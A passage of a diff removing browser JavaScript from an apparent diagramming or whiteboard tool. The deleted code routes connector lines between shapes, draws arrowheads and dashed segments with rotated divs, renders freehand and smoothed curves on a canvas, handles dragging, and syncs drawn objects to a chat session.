-                  [xy[0]+xyx[0]/2,xy[1]],
-                  [xy[0]+xyx[0]/2,xy[1]+xyx[1]]
-                  ];
-                  sobj.toshape();
-                  sobj.onshape = true;
-            }
-            else  if( !(sobj.shapename!='circle'&& sobj.shapename!='hexgon' && sobj.shapename!='diamond'
-               &&  sobj.shapename!='ellipse'&& sobj.shapename!='egg') || this.ey == 0 || this.ey == 1)
-            {
-                B = [
-                [sobj.x , sobj.y + hh/2-adj/2],
-                [sobj.x + sobj.base.offsetWidth,   sobj.y + hh/2-adj/2],
-                [sobj.x + sobj.base.offsetWidth/2, sobj.y],
-                [sobj.x + sobj.base.offsetWidth/2, sobj.y + hh-adj]
-               ];
-            }
-            else if (yy > 1)
-            {
-                B =[ [sobj.x + (wdd-1)*sobj.width/2, pa + sobj.y   + yy],
-                   [sobj.x +   sobj.base.offsetWidth, pa+ sobj.y  + yy+ sobj.framew()]];
-            }
-            else  if (yy < 1)
-            {
-                B =[ [sobj.x + (wdd-1)*sobj.width/2, pa+ sobj.y +  yy*(sobj.height)+ sobj.framew() ],
-                   [sobj.x +sobj.base.offsetWidth, pa+ sobj.y +  yy*(sobj.height)+ sobj.framew()]];
-            }
-            return B;
-   }
-   this.draw = function()
-   {
-        var ss = '';
-        this.k =0;
-        if (this.startnum == this.endnum && (this.startnum!=-1 || this.endnum!=-1))
-        {
-            return;
-        }
-        var A, B;
-        var obja = null,objb = null;
-        if (this.startnum>=0)
-            obja = allShapes[this.startnum];
-        if (this.endnum>=0)
-            objb = allShapes[this.endnum];
-        
-        if (obja!=null)
-        {
-            var target = [this.ex, this.ey];
-            if (objb!=null) { target[0] = objb.base.offsetWidth/2 + objb.x;
-              target[1] =  objb.base.offsetHeight/2 + objb.y;}
-            A = this.lineends(obja,target,this.sy);
-            rotatepoint(A,obja);
-            ss += A.toString() + '\n';
-        }
-        else
-        {
-            A = [[this.sx, this.sy]];
-        }
-        if (objb != null)
-        {
-            var target = [this.sx, this.sy];
-            if (obja!=null) { target[0] = obja.base.offsetWidth/2 + obja.x;
-              target[1] =  obja.base.offsetHeight/2 + obja.y;}
-            B = this.lineends(objb,target, this.ey);
-            rotatepoint(B, objb);
-            ss += B.toString() + '\n';
-        }
-        else
-        {
-            B = [[this.ex, this.ey]];
-        // this.mdiv(this.ex, this.ey,4, 6, "&times;");
-        }
-         
-        var m = 100000000;
-        var mi = 0;
-        var mj = 0;
-        var sss= '';
-        for (var i=0; i < A.length; i++)
-        for (var j=0; j < B.length; j++)
-        {
-            if (this.direct%2 == 0)
-            var d =  Math.sqrt( (A[i][0] - B[j][0])*(A[i][0] - B[j][0]) + (A[i][1] - B[j][1])*(A[i][1] - B[j][1]));
-            else if (this.direct%2 == 1)
-                d = Math.abs(A[i][0] - B[j][0])  + Math.abs(A[i][1] - B[j][1]);
-            sss += Math.round(d) + ' ' + i +  '  ' + j ;
-            if (d < m && !( i == 1 &&  j >=2 && A[i][0] > B[j][0]  || i == 0 && j>=2 && A[i][0] < B[j][0])
-                      && !(i==1 && j==0 && A[i][0] > B[j][0] || i==0 && j==1 && A[i][0] < B[j][0])
-                      && !(i==3 && j==2 && A[i][1] > B[j][1] || i==2 && j==3 && A[i][1] < B[j][1]))
-            {
-                m = d;
-                mi= i;
-                mj= j;
-                sss += ' x';
-            }
-            sss += '\n';
-        }
-
-        var Ax = A[mi][0];
-        var Ay = A[mi][1];
-        var Bx = B[mj][0];
-        var By = B[mj][1];
-
-        var bx = Bx;
-        var by = By;
-
-        var way = '';
-        if (mi == 0 && mj ==1 || mi == 1 && mj ==0 ) way = 'hh';
-        if (mi == 0 && mj ==0 || mi == 1 && mj ==1 ) way = 'vhv';
-        if (mi < 2 && mj >=2) way = 'hv';
-        if (mi >= 2 && mj < 2) way = 'vh';
-        if (mi == 2 && mj ==3 || mi == 3 && mj ==2) way = 'vv';
-        if (mi == 2 && mj ==2 || mi == 3 && mj ==3) way = 'vh';
-        var mg = '';
-        if (this.type == 'arrow')
-            mg = ' ';
-        else if (this.type == 'arrom')
-            mg = ' ';
-        else if (this.type == 'diamond')
-            mg = ' ';
-
-        var f = this.thickw(this.thick)/4;
-        if (this.direct%2 == 0)
-        {
-            this.drawLine(Ax,Ay,Bx,By,this.thick,mg);
-        }
-        else if (this.direct%2 == 1)
-        {
-            if (way== 'hv')
-            {
-                if (!(this.startnum>=0 && allShapes[this.startnum].inbase(Bx,Ay))
-                 && !(this.endnum>=0 && allShapes[this.endnum].inbase(Bx,Ay)))
-                {
-                    this.drawLine(Ax,Ay,Bx+(Bx>Ax?(f):(-f)),Ay,this.thick);
-                    this.drawLine(Bx,Ay,Bx,By,this.thick,mg);
-                }
-                else
-                {
-                    this.drawLine(Ax,Ay,Ax,By +(By>Ay?(f):(-f)),this.thick);
-                    this.drawLine(Ax,By,Bx,By,this.thick,mg);
-                }
-            }
-            else if (way== 'vhv')
-            {
-                if (!(this.startnum>=0 && allShapes[this.startnum].inbase(Bx,Ay))
-                        && !(this.endnum>=0 && allShapes[this.endnum].inbase(Bx,Ay)))
-                {
-                this.drawLine(Ax,Ay,Bx+(Bx>Ax?(f):(-f)),Ay,this.thick);
-                this.drawLine(Bx,Ay,Bx,By,this.thick,mg);
-                }
-                else
-                {
-                this.drawLine(Ax,Ay,Ax+ (mi==1?1:(-1))*20,Ay,this.thick);
-                this.drawLine(Ax+(mi==1?1:(-1))*20,Ay,Ax+(mi==1?1:(-1))*20,By +(By>Ay?(f):(-f)),this.thick);
-                this.drawLine(Ax+(mi==1?1:(-1))*20,By,Bx,By,this.thick,mg);
-                }
-            }
-            else if (way== 'vh')
-            {
-                if (!(this.startnum>-1 && allShapes[this.startnum].inbase(Ax,By))
-                   && !(this.endnum>-1 && allShapes[this.endnum].inbase(Ax,By)) )
-                {
-                   this.drawLine(Ax ,Ay,Ax,By + (By>Ay?f:(-f)),this.thick);
-                   this.drawLine(Ax ,By,Bx, By,this.thick,mg);
-                }
-                else
-                {
-
-                   this.drawLine(Ax ,Ay,Bx +(Bx>Ax?(-f):f),Ay ,this.thick);
-                   this.drawLine(Bx ,Ay,Bx, By,this.thick,mg);
-
-                }
-            }
-            else if (way== 'hh')
-            {
-
-                this.drawLine(Ax,Ay ,(Ax+Bx)/2 +(Bx>Ax?f:(-f)),Ay,this.thick);
-                this.drawLine((Ax+Bx)/2 ,Ay,(Ax+Bx)/2 ,By + (By>Ay?f:(-f)),this.thick);
-                this.drawLine((Ax+Bx)/2 ,By,Bx,By ,this.thick, mg);
-            }
-            else if (way== 'vv')
-            {
-
-                this.drawLine(Ax,Ay ,Ax ,(Ay + By)/2 +(By>Ay?f:(-f)) ,this.thick);
-                this.drawLine(Ax,(Ay + By)/2  ,Bx +(Bx>Ax?f:(-f)),(Ay + By)/2,this.thick);
-                this.drawLine(Bx ,(Ay + By)/2,Bx, By,this.thick, mg);
-            }
-       }
-       if (chatsessionnum > -1 &&  sentline== false)
-       {
-            parent.sendObject(chatsessionnum, this.num + " l" +  this.toString());
-       }
-       sentline = false;
-       document.onmousemove = onmouseover0;
-
-   }
-  
- 
-   this.drawLine = function(Ax,Ay,Bx,By,thick,mg)
-   {
-      this.drawl(Ax,Ay,Bx,By,thick,mg);
-
-   }
-   this.thickw = function(thick)
-   {
-       if (thick > 4) return 10;
-       var f = [2, 4, 6, 8, 10];
-       return f[thick];
-   }
-   this.drawlo = function(x0,y0,x1,y1,thick,mg)
-   {
-       var  dv =  document.createElement('div');
-       dv.id = "l" + this.num +"_" + (this.k++);
-       var f = this.thickw(thick)/2;
-       if (mg!=null) mg = this.type;
-       
-       if (mg == 'arrow')
-       {
-           mg = '<div style="margin:-'+(f/2) + 'px 1px -' + (f/2) + 'px -1px;width:0px;height:0px;border-top:' + (f) + 'px solid transparent;border-left:' + f*2 + 'px solid ' + colors[this.color] +  ';border-bottom:' + (f) + 'px solid transparent;"><!----></div>';
-       }
-       else if (mg == 'arrom')
-       { 
-           mg = '<div style="margin:-'+(f/2) + 'px 1px -' + (f/2) + 'px -1px;width:0px;height:0px;border-top:' + (f) + 'px solid transparent;border-right:' + f*2 + 'px solid ' + colors[this.color] +  ';border-bottom:' + (f) + 'px solid transparent;"><!----></div>';
-       }
-       else if (mg == 'diamond')
-       {
-           mg = '<div style="margin:-'+(f*0.5) + 'px -' + (f*0.20) + 'px -' + (f*0.5) + 'px ' + (f*0.20) + 'px;width:' + (f*2/1.41) + 'px;height:' + (f*2/1.41) + 'px;background-color:' + colors[this.color] +  ';-ms-transform:rotate(45deg);-webkit-transform:rotate(45deg);transform:rotate(45deg);transform-origin:50% 50%"><!----></div>';
-       }
-       else 
-       {
-           mg = '';
-          
-       }
-        var ml =   (y1>y0?(-f+2):(-2));
-        var width = Math.sqrt((y1-y0)*(y1-y0) + (x1-x0)*(x1-x0))  ;
-        if (width < f) {mg = '';  }
-        var left =  (x1+x0)/2 - (width)/2;
-        var top =   (y1+y0)/2 + ml;
-        var height = f;
-
-        if (y1==y0)
-        {
-            left = x1>x0?x0:x1;
-            top = y0-f/2;
-            width = Math.abs(x1-x0)  ;
-            height = f;
-        }
-        else if (x1==x0)
-        {
-            width = Math.abs(y1-y0) ;
-            height = f;
-            left = x1 - width/2;
-            top = (y1+y0)/2 + ml;
-        }
-
-        if (x1==x0)
-        {
-            if (y1>y0)
-            var deg = 90;
-            else
-                deg = 270;
-        }
-        else if (y1==y0)
-        {
-            if (x1<x0) deg = 180;
-            else deg = 0;
-        }
-        else if (Math.abs(x1-x0) > Math.abs(y1-y0) )
-    {
-         deg  =   Math.atan2(y1-y0, x1-x0)*180/3.14159265;
-    }
-    else
-    {
-        deg  = -Math.atan2(x1-x0,y1-y0)*180/3.14159265 + 90;
-    }
-     {
-        if (mg!=null && mg!='')
-        {
-            if (this.direct > 1)
-            {
-               var tds = '';
-               var j=0;
-               while ((j+1) * f < width-1.5*f)
-               {
-                   tds += "<td width=" + f + " valign=middle><div style=\"margin:0px 0px 0px 0px;width:" + f + "px;height:" + f + "px;background-color:" + ((j%2==0)?colors[this.color]:'transparent')  + "\"><!----></div></td>";
-                   j++;
-               }
-               tds += "<td width=" + (width-1.5*f-j * f) + " valign=middle><div style=\"margin:0px 0px 0px 0px;width:" + (width-1.5*f-j * f) + "px;height:" + f + "px;background-color:" + ((j%2==0)?colors[this.color]:'transparent')  + "\"><!----></div></td>"
-
-            }
-            else
-                tds = "<td width=" + (width-1.5*f) + " valign=middle><div style=\"margin:0px 0px 0px 0px;width:" + (width-1.5*f) + "px;height:" + f + "px;background-color:" +  colors[this.color]  + "\"><!----></div></td>";
-            dv.style.cssText = 'z-index:0;position:absolute;left:'
-            + left + 'px;top:'
-            + top +  'px;width:'
-            + width + 'px;height:'
-            + f + 'px;-ms-transform: rotate(' + deg
-            + 'deg);-webkit-transform: rotate('+ deg + 'deg);transform: rotate('  + deg + 'deg);z-index:0;padding:0px 0px 0px 0px;margin:0px 0px 0px 0px;';
-            dv.innerHTML = '<table cellpadding=0 cellspacing=0><tr height=' + f + " valign=middle>" + tds + "<td style=\"color:" + (colors[this.color]) + "\" width=" + f + " align=center valign=middle>" + mg + "</td></tr></table>";
-        }
-        else
-        {
-            if (this.direct > 1)
-            {
-               var tds = '';
-               var j=0;
-               while ((j+1) * f < width)
-               {
-                   tds += "<td width=" + f + " valign=middle><div style=\"margin:0px 0px 0px 0px;width:" + f + "px;height:" + f + "px;background-color:" + ((j%2==0)?colors[this.color]:'transparent')  + "\"><!----></div></td>";
-                   j++;
-               }
-               tds += "<td width=" + (width-j * f) + " valign=middle><div style=\"margin:0px 0px 0px 0px;width:" + (width-j * f) + "px;height:" + f + "px;background-color:" + ((j%2==0)?colors[this.color]:'transparent')  + "\"><!----></div></td>"
-
-            }
-            dv.style.cssText = 'z-index:0;position:absolute;left:'
-            + left + 'px;top:'
-            + top +  'px;width:'
-            + (width) + 'px;height:'
-            + f + "px;padding:0px;" +  (this.direct<=1?("background-color:" + colors[this.color]):'')  + ';-ms-transform: rotate(' + deg
-            + 'deg);-webkit-transform: rotate('+ deg + 'deg);transform: rotate('  + deg + 'deg);z-index:0;padding:0px 0px 0px 0px;margin:0px -1px 0px 0px;';
-            if (this.direct>1)
-                dv.innerHTML = '<table cellpadding=0 cellspacing=0><tr height=' + f + " valign=middle>" + tds + "</tr></table>";
-        }
-    }
-    document.body.appendChild(dv);
-
-    return dv;
-   }
-
-
-   this.drawl = function(x0, y0, x1, y1, thick,mg)
-   {
-       var  dv = this.drawlo(x0,y0,x1,y1,thick,mg);
-       if (this.startnum== -1 && this.endnum== -1)
-       {
-
-            if (editable)Drag.init(dv);
-            dv.onDragStart = function(x,y)
-            {
-
-                var tnum = parseInt(this.id.substring(1, this.id.indexOf("_") ) );
-                current(tnum);
-                allLines[tnum].x = x;
-                allLines[tnum].y = y;
-            }
-            dv.onDragEnd = function(x,y)
-            {
-                var tnum = parseInt(this.id.substring(1, this.id.indexOf("_") ) );
-                var d = (allLines[tnum].x - x)*(allLines[tnum].x - x) +
-                        (allLines[tnum].y - y)*(allLines[tnum].y - y) ;
-                if (d > 4)
-                {
-                    allLines[tnum].sx += x - allLines[tnum].x;
-                    allLines[tnum].sy += y - allLines[tnum].y;
-                    allLines[tnum].ex += x - allLines[tnum].x;
-                    allLines[tnum].ey += y - allLines[tnum].y;
-                    allLines[tnum].redraw();
-                }
-                else
-                  mdia(tnum,2);
-            }
-       }
-       else
-       {
-            dv.onclick = function()
-            {
-             var tnum = parseInt(this.id.substring(1, this.id.indexOf("_") ) );
-             mdia(tnum,2) ;
-            }
-
-       }
-       dv.style.zIndex = "0";
-   }
-   this.hide = function()
-   {
-       var k = 0, t;
-        while (true)
-           {
-               t = $('l' + this.num + '_' + k);
-               if (t==null) break;
-               t.style.visibility = 'hidden';
-               k++;
-           }
-   }
-   this.show = function()
-   {
-       var k = 0, t;
-        while (true)
-           {
-               t = $('l' + this.num + '_' + k);
-               if (t==null) break;
-               t.style.visibility = 'visible';
-               k++;
-           }
-   }
-   this.mdiv = function(x,y,w,h,mg)
-   {
-       var dv = document.createElement("div");
-       dv.id = "l" + this.num +"_" + (this.k++);
-       if (mg== '' || mg == null)
-           dv.style.cssText = "z-index:0;position:absolute;left:"+ x +"px;top:"+y +"px;width:" + w +"px;height:" + h +"px;background-color:" +  colors[this.color] +";padding:0px 0px 0px 0px;margin:0px 0px 0px 0px;font-size:1px";
-       else
-           dv.style.cssText = "z-index:0;position:absolute;left:"+ x +"px;top:"+y +"px;background-color:transparent;color:" +  colors[this.color] +";padding:0px 0px 0px 0px;margin:0px 0px 0px 0px;font-size:" + w + "px;width:" + w +"px;height:"+ w +"px";
-
-       if (mg== '' || mg == null)
-       {
-           dv.innerHTML = "<!---->";
-       }
-       else
-       {
-           dv.innerHTML = mg;
-       }
-       if (this.startnum== -1 && this.endnum== -1)
-       {
-
-            if (editable)Drag.init(dv);
-            dv.onDragStart = function(x,y)
-            {
-
-                var tnum = parseInt(this.id.substring(1, this.id.indexOf("_") ) );
-                current(tnum);
-                allLines[tnum].x = x;
-                allLines[tnum].y = y;
-            }
-            dv.onDragEnd = function(x,y)
-            {
-
-                var tnum = parseInt(this.id.substring(1, this.id.indexOf("_") ) );
-                var d = (allLines[tnum].x - x)*(allLines[tnum].x - x) +
-                        (allLines[tnum].y - y)*(allLines[tnum].y - y) ;
-                if (d > 4)
-                {
-                    allLines[tnum].sx += x - allLines[tnum].x;
-                    allLines[tnum].sy += y - allLines[tnum].y;
-                    allLines[tnum].ex += x - allLines[tnum].x;
-                    allLines[tnum].ey += y - allLines[tnum].y;
-                    allLines[tnum].redraw();
-                }
-                else
-                  mdia(tnum,2);
-            }
-       }
-       else
-       {
-            dv.onclick = function()
-            {
-               var tnum = parseInt(this.id.substring(1, this.id.indexOf("_") ) );
-               mdia(tnum,2) ;
-            }
-
-       }
-       document.body.appendChild(dv);
-
-   }
-
-   this.remove = function()
-   {
-      var k=0;
-      var z;
-      while (true)
-      {
-          z = $("l" + this.num +"_" + k);
-          if (z == null) break;
-
-          try{
-              document.body.removeChild(z);
-          } catch(e){ }
-          k++;
-      }
-   }
-   this.delme = function()
-   {
-       this.remove();
-       allLines[this.num] = null;
-       if (chatsessionnum== -1 && this.num== numLines-1)
-         numLines--;
-   }
-   this.redraw = function()
-   {
-      this.remove();
-      this.draw();
-   }
-   this.draw();
-}
-
-
-function Curve(ordernum, type, thick, cl,start, tm, zi, points)
-{
-   if (ordernum == null)
-      this.num = numCurves;
-   else
-      this.num = ordernum;
-   numCurves++;
-   allCurves[this.num] = this;
-   this.points = points;
-   this.type = type;
-   this.thick = thick;
-   this.time = tm;
-   this.start = start;
-   if (zi==null) zi=-1;
-   this.zindex = zi;
-   this.k = 0;
-   this.kk = 0;
-   this.color = cachedcurvecolor;
-   if (cl != null && cl != '')
-   {
-       this.color = cl;
-
-   }
-   this.x = 0;
-   this.y = 0;
-   this.visible = 1;
-   this.toString = function()
-   {
-       var s =  this.type + ","  + this.thick + "," + this.color + "," + this.start.toFixed(3) + "_" + this.time.toFixed(3)+ "," + this.zindex;
-       if (this.points!=null && this.points.length>0)
-       {
-           s += "," + this.points[0][0] + "," + this.points[0][1];
-           for (var i=1; i < this.points.length; i++)
-           {
-               if ( Math.abs(this.points[i][0]-this.points[i-1][0]) + Math.abs(this.points[i][1]-this.points[i-1][1]) > 0)
-               s += "," + (this.points[i][0]-this.points[i-1][0]) + "," + (this.points[i][1]-this.points[i-1][1]);
-           }
-       }
-       return s;
-   }
-   this.drawcurve = function()
-   {
-       var minx = 10000,maxx =-10000, miny=10000,maxy=-10000;
-       for (var i=0; i < this.points.length; i++)
-       {    if (this.points[i][0] < minx)
-               minx = this.points[i][0];
-           else if (this.points[i][0] > maxx)
-               maxx = this.points[i][0];
-           if (this.points[i][1] < miny)
-               miny = this.points[i][1];
-           else if (this.points[i][1] > maxy)
-               maxy = this.points[i][1];
-       }
-       minx -=this.thick;
-       maxx +=this.thick;
-       miny -=this.thick;
-       maxy +=this.thick;
-       var cvs = document.createElement('div');
-       cvs.id= 'c' + this.num;
-       cvs.style.cssText = 'position:absolute;left:' +  minx + 'px;top:' + miny + 'px;width:' + (maxx-minx +2*this.thick ) + 'px;overflow:visible;padding:0px;';
-       cvs.innerHTML = "<canvas style=\"margin:0px\" id=\"j" + this.num + "\" width=" + (maxx-minx + 2*this.thick) + " height=" + (maxy-miny + 2*this.thick) + "  >Your browser does not support the HTML5 canvas tag.</canvas>";
-       document.body.appendChild(cvs);
-       this.drawoncanvas();
-       Drag.init(cvs);
-       cvs.onmouseenter = function()
-       {
-           showanchor(this,this,'se');
-       }
-       cvs.onDragStart = function(x,y)
-        {
-            var tnum = parseInt(this.id.substring(1) );
-            allCurves[tnum].x = x;
-            allCurves[tnum].y = y;
-        }
-        cvs.onDragEnd = function(x,y)
-        {
-            var tnum = parseInt(this.id.substring(1) );
-            if (tnum + '' == 'NaN') return;
-            var d = [allCurves[tnum].x - x,allCurves[tnum].y - y];
-            var ds = d[0]*d[0] + d[1]*d[1];
-            if (ds > 4)
-            {
-               for (var j=0; j < allCurves[tnum].points.length; j++)
-               {
-                   allCurves[tnum].points[j][0] -= d[0];
-                   allCurves[tnum].points[j][1] -= d[1];
-               }
-               allCurves[tnum].x = x;
-               allCurves[tnum].y = y;
-               var p = whichally(tnum,4);
-               if (p > -1)
-               {
-                   var ns = allies[pagenum][p].split(/,/);
-                   for (var j=1; j < ns.length; j++)
-                   {
-                       var num = parseInt(ns[j]);
-                       if (num==tnum) continue;
-                       for (var j=0; j < allCurves[num].points.length; j++)
-                       {
-                           allCurves[num].points[j][0] -= d[0];
-                           allCurves[num].points[j][1] -= d[1];
-                       }
-                       allCurves[num].x = x-d[0];
-                       allCurves[num].y = y-d[1];
-                   }
-               }
-            }
-            else
-            {
-                mdia(tnum,4);
-            }
-            hideanchor(tnum);
-        }
-        showanchor(cvs, cvs, 'se');
-   }
-   
-   this.drawoncanvas = function(f, t)
-   {
-        var cv = document.getElementById("j" + this.num);
-        var ctx = cv.getContext("2d");
-        ctx.beginPath();
-        if (this.type=='curve' || this.type=='smooth')
-           ctx.setLineDash([0]);
-        else if (this.type=='dotted'||this.type=='dsmooth')
-           ctx.setLineDash([5]); 
-        ctx.lineWidth =  this.thick;
-        ctx.strokeStyle = colors[this.color];
-         var minx = 10000,maxx =-10000, miny=10000,maxy=-10000;
-       
-       for (var i=0; i < this.points.length; i++)
-       {    if (this.points[i][0] < minx)
-               minx = this.points[i][0];
-           else if (this.points[i][0] > maxx)
-               maxx = this.points[i][0];
-           if (this.points[i][1] < miny)
-               miny = this.points[i][1];
-           else if (this.points[i][1] > maxy)
-               maxy = this.points[i][1];
-       }
-       minx -=this.thick;
-       maxx +=this.thick;
-       miny -=this.thick;
-       maxy +=this.thick;
-       var points = [];
-        for (var i = 0; i < this.points.length; i++ ) 
-        {
-            points.push({x:(this.points[i][0]-minx ),y:(this.points[i][1]-miny)});
-        }
-        ctx.beginPath();
-        ctx.moveTo(points[0].x, points[0].y);
-       if ( (this.type=='curve' || this.type=='dotted') && this.points.length > 1)
-       {  
-        if (typeof(f) == 'undefined') f = 0.3;
-        if (typeof(t) == 'undefined') t = 0.6;
-        
-     
- 
-        var m = 0;
-        var dx1 = 0, dx2;
-        var dy1 = 0, dy2;
-
-        var preP = points[0];
-        for (var i = 1; i < points.length; i++) 
-        {
-            var curP = points[i];
-            var nexP = points[i + 1];
-            if (nexP ) {
-                if (nexP.x != preP.x){
-                m = (nexP.y-preP.y)/(nexP.x-preP.x);
-                dx2 = (nexP.x - curP.x) * -f;
-                dy2 = dx2 * m * t;}
-                else if (nexP.y==preP.y)
-                {
-                    dx2 = (nexP.x - curP.x) * -f;
-                    dy2 = dx2 * t; 
-                }
-                else if (nexP.x == curP.x)
-                {
-                    dx2 = 0;
-                    dy2 = (nexP.y-preP.y)*(-f*t);
-                }
-                else
-                {
-                     dx2 = 0;
-                     dy2 = 0;
-                }
-            } else {
-                dx2 = 0;
-                dy2 = 0;
-            }
-            ctx.bezierCurveTo(preP.x - dx1, preP.y - dy1, curP.x + dx2, curP.y + dy2, curP.x, curP.y);
-            dx1 = dx2;
-            dy1 = dy2;
-            preP = curP;
-        }
-    }
-    else if ((this.type=='smooth' || this.type=='dsmooth') && points.length > 1)
-    {    i=0;
-        if (points.length  > 2)
-        for (i = 0; i  < points.length-2; i ++)
-        {
-            var xc = (points[i].x + points[i + 1].x) / 2;
-            var yc = (points[i].y + points[i + 1].y) / 2;
-            ctx.quadraticCurveTo(points[i].x, points[i].y, xc, yc);
-        }
-        ctx.quadraticCurveTo(points[i].x, points[i].y, points[i+1].x,points[i+1].y);
-    }
-        ctx.stroke();
-   }
-   
-   this.draw = function(ii)
-   {
-        if (this.type=='curve' || this.type=='dotted'||this.type=='smooth' || this.type=='dsmooth')
-        {
-            this.drawcurve();
-            return;
-        }
-        var j  = 0;
-        if (ii != null)
-            j = ii;
-        else
-            this.k =0;
-        for (var i=j; i < this.points.length-1; i++)
-        {
-            if(this.points[i]==null || this.points[i+1]==null) continue;
-            if (  this.points[i][0]== this.points[i+1][0]  && this.points[i][1]== this.points[i+1][1])
-            continue;
-            this.drawLine(this.points[i][0],this.points[i][1],this.points[i+1][0],this.points[i+1][1]);
-            if ( ii == null && (i==0 || this.points[i][0] != this.points[i-1][0] || this.points[i][1] !=this.points[i-1][1]))
-            {
-                this.drawDot(this.points[i][0],this.points[i][1],i);
-            }
-        }
-        i = this.points.length-1;
-        if (  (i== 0 || this.points[i]!=null && this.points[i-1]!=null && this.points[i][0] != this.points[i-1][0]  || this.points[i][1] != this.points[i-1][1]) )
-        {
-                this.drawDot(this.points[i][0],this.points[i][1],i);
-        }
-       if (ii == null && chatsessionnum > -1 &&  sentline== false)
-       {
-            parent.sendObject(chatsessionnum, this.num + " c" +  this.toString());
-       }
-       sentline = false;
-       document.onmousemove = onmouseover0;
-   }
-   this.hide = function()
-   {
-       var t = $('c' + this.num);
-       if (t!=null)
-       {
-           t.style.visibility = 'hidden';
-       }
-       else
-       {
-           var k =0;
-           while (true)
-           {
-               t = $('c' + this.num + '_' + k);
-               if (t==null) break;
-               t.style.visibility = 'hidden';
-               k++;
-           }
-       }
-   }
-   this.show = function()
-   {
-       var t = $('c' + this.num);
-       if (t!=null)
-       {
-           t.style.visibility = 'visible';
-       }
-       else
-       {
-           var k =0;
-           while (true)
-           {
-               t = $('c' + this.num + '_' + k);
-               if (t==null) break;
-               t.style.visibility = 'visible';
-               k++;
-           }
-       }
-   }
-   this.drawl = function(x0, y0, x1, y1, thick )
-{
-    var  dv = document.createElement('div');
-    dv.id = "c" + this.num +"_" + (this.k++);
-    if (Math.abs(x1-x0) > Math.abs(y1-y0) )
-    {
-        var width = Math.sqrt((y1-y0)*(y1-y0) + (x1-x0)*(x1-x0));
-        var left =   (x1+x0)/2 - width/2;
-        var top =   (y1+y0)/2 - thick/2;
-        var height = thick;
-        var deg  = Math.atan2(y1-y0, x1-x0)*180/3.14159265;
-        if (this.type == 'dotline'){
-        dv.style.cssText = 'position:absolute;left:'
-        + left + 'px;top:'
-        + top +  'px;width:'
-        + width + 'px;height:'
-        + height + 'px;-ms-transform: rotate(' + deg
-        + 'deg);-webkit-transform: rotate('+ deg + 'deg);transform: rotate('  + deg + 'deg);z-index:5;padding:0px 0px 0px 0px;margin:0px 0px 0px 0px;font-size:1px';
-        
-          dv.innerHTML = "<div style=\"margin:0px;padding:0px;border:0px;height:0px;width:" +  width + "px;border-top-width:" + this.thick + 'px;border-top-color:' + colors[this.color] + ";border-top-style:dotted\"><!----></div>";
-        }else
-        {
-            dv.style.cssText = 'position:absolute;left:'
-        + left + 'px;top:'
-        + top +  'px;width:'
-        + width + 'px;height:'
-        + height + 'px;background-color:' + colors[this.color] + ';-ms-transform: rotate(' + deg
-        + 'deg);-webkit-transform: rotate('+ deg + 'deg);transform: rotate('  + deg + 'deg);z-index:5;padding:0px 0px 0px 0px;margin:0px 0px 0px 0px;font-size:1px';
-         dv.innerHTML = "<!---->"; 
-      }
-        document.body.appendChild(dv);
-    }
-    else //if (Math.abs(x1-x0) < Math.abs(y1-y0) )
-    {
-        var height = Math.sqrt((y1-y0)*(y1-y0) + (x1-x0)*(x1-x0));
-        var left =  (x1+x0)/2 - thick/2;
-        var top =    (y1+y0)/2 - height/2;
-        var width = thick;
-        var deg  = -Math.atan2(x1-x0,y1-y0)*180/3.14159265;
-        if (this.type == 'dotline'){
-        dv.style.cssText = 'position:absolute;left:'
-        + left + 'px;top:'
-        + top +  'px;width:'
-        + width + 'px;height:'
-        + height + 'px;-ms-transform: rotate(' + deg
-        + 'deg);-webkit-transform: rotate('+ deg + 'deg);transform: rotate('  + deg + 'deg);z-index:5;padding:0px 0px 0px 0px;margin:0px 0px 0px 0px;font-size:1px';
-           dv.innerHTML = "<div style=\"border:0px;width:0px;height:" +  height + "px;border-right-width:" + this.thick + 'px;border-right-color:' + colors[this.color] + ";border-right-style:dotted\"><!----></div>";
-        }
-        else
-        {
-            dv.style.cssText = 'position:absolute;left:'
-        + left + 'px;top:'
-        + top +  'px;width:'
-        + width + 'px;height:'
-        + height + "px;background-color:" + colors[this.color] + ';-ms-transform: rotate(' + deg
-        + 'deg);-webkit-transform: rotate('+ deg + 'deg);transform: rotate('  + deg + 'deg);z-index:5;padding:0px 0px 0px 0px;margin:0px 0px 0px 0px;font-size:1px';
-        
-          dv.innerHTML = "<!---->"; 
-        }
-        document.body.appendChild(dv);
-    }
-       
-       Drag.init(dv);
-       dv.onDragStart = function(x,y)
-        {
-
-            var tnum = parseInt(this.id.substring(1, this.id.indexOf("_") ) );
-            current(tnum);
-            allCurves[tnum].x = x;
-            allCurves[tnum].y = y;
-        }
-        dv.onDragEnd = function(x,y)
-        {
-
-            var tnum = parseInt(this.id.substring(1, this.id.indexOf("_") ) );
-            if (tnum + '' == 'NaN') return;
-            var d = [allCurves[tnum].x - x,allCurves[tnum].y - y];
-            var ds = d[0]*d[0] + d[1]*d[1];
-            if (ds > 4)
-            {
-                for (var i=0; i < allCurves[tnum].points.length; i++)
-                {
-                    for (var j=0; j < 2; j++)
-                    {
-                        allCurves[tnum].points[i][j] -= d[j];
-                    }
-                }
-                allCurves[tnum].redraw();
-                
-                var p = whichally(tnum,4);
-               if (p > -1)
-               {
-                   var ns = allies[pagenum][p].split(/,/);
-                   for (var j=1; j < ns.length; j++)
-                   {
-                       var num = parseInt(ns[j]);
-                       if (num==tnum) continue;
-                       for (var i=0; i < allCurves[num].points.length; i++)
-                        {
-                            for (var j=0; j < 2; j++)
-                            {
-                                allCurves[num].points[i][j] -= d[j];
-                            }
-                        }
-                        allCurves[num].redraw();
-                   }
-               }
-            }
-            else
-            {
-                mdia(tnum,4);
-            }
-        }
-       document.body.appendChild(dv);
-   }
-
-   this.drawLine = function(Ax,Ay,Bx,By)
-   {
-       this.drawl(Ax,Ay,Bx,By,this.thick);
-       return;
-
-   }
-   this.mdiv = function(x,y,w,h)
-   {
-       if (w == 0 || h == 0) return;
-       var dv = document.createElement("div");
-       dv.id = "c" + this.num +"_" + (this.k++);
-       dv.style.cssText = "z-index:1;position:absolute;left:"+ x +"px;top:"+y +"px;width:" + w +"px;height:" + h +"px;background-color:" + colors[this.color] +";padding:0px 0px 0px 0px;margin:0px 0px 0px 0px;font-size:1px";
-       dv.innerHTML = "<!---->";
-       Drag.init(dv);
-       dv.onDragStart = function(x,y)
-        {
-
-            var tnum = parseInt(this.id.substring(1, this.id.indexOf("_") ) );
-            current(tnum);
-            allCurves[tnum].x = x;
-            allCurves[tnum].y = y;
-        }
-        dv.onDragEnd = function(x,y)
-        {
-            var tnum = parseInt(this.id.substring(1, this.id.indexOf("_") ) );
